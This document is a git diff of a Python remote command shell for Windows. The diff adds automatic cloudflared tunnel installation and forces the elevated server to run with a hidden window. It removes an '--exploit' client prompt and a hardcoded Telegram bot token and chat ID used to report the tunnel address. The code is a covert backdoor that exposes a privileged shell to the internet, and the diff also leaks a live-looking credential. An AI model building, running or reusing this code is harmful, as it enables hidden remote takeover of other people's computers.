@@ -1,53 +1,30 @@
 from re import search
-from aiogram import Bot
 from ctypes import windll
 from os import getcwd, chdir
-from dataclasses import dataclass
-from websockets import serve, connect
+from websockets import serve
+from asyncio import Future, to_thread
 from sys import executable, argv, exit
 from subprocess import Popen, PIPE, STDOUT, run
-from asyncio import run as async_run, Future, to_thread
 
-
-@dataclass
-class Config:
-    port: int = 3301
-    host: str = "0.0.0.0"
-    chat_id: int = 8810484379
-    token: str = "8828822456:AAEuFpjZiiv0ocGFoAiqGfHXGlj0dm-n67Y"
-    url: str | None = None
-
-    def __post_init__(self):
-        self.bot = Bot(self.token)
-
-
-class Client(Config):
-    def __init__(self):
-        super().__init__()
-        self.url = argv[2].replace("https://", "wss://")
-
-    async def run(self):
-        async with connect(self.url) as websocket:
-            while True:
-                command = input("[Shell] > ").strip()
-
-                if command == "exit":
-                    return
-
-                if command in ("cls", "clear"):
-                    print("\x1b[2J\x1b[H", end="")
-                    continue
-
-                if not command:
-                    continue
-
-                await websocket.send(command)
-                print(await websocket.recv())
-
+from src.config import Config
 
 class Server(Config):
     def __init__(self):
         super().__init__()
+
+    def ensure_cloudflared(self):
+        check = run("cloudflared --version", shell=True, capture_output=True, text=True)
+
+        if check.returncode == 0:
+            return True
+
+        print("cloudflared not found. Installing via winget...")
+        install = run(
+            "winget install Cloudflare.Cloudflared",
+            shell=True
+        )
+
+        return install.returncode == 0
 
     async def listener(self, websocket):
         async for command in websocket:
@@ -107,11 +84,17 @@ class Server(Config):
                 "runas",
                 executable,
                 " ".join(argv),
-                None,
-                int("--silent" not in argv)
+                None, 0
+                #int("--silent" not in argv)
             )
             exit()
 
+        # Проверяем cloudflared
+        if not self.ensure_cloudflared():
+            print("Failed to install cloudflared.")
+            exit()
+
+        # Создаём туннель
         if self.create_tunnel():
             print("Tunnel:", self.url)
 
@@ -122,7 +105,3 @@ class Server(Config):
 
             async with serve(self.listener, self.host, self.port):
                 await Future()
-
-
-if __name__ == "__main__":
-    async_run(Client().run()) if "--exploit" in argv else async_run(Server().run())
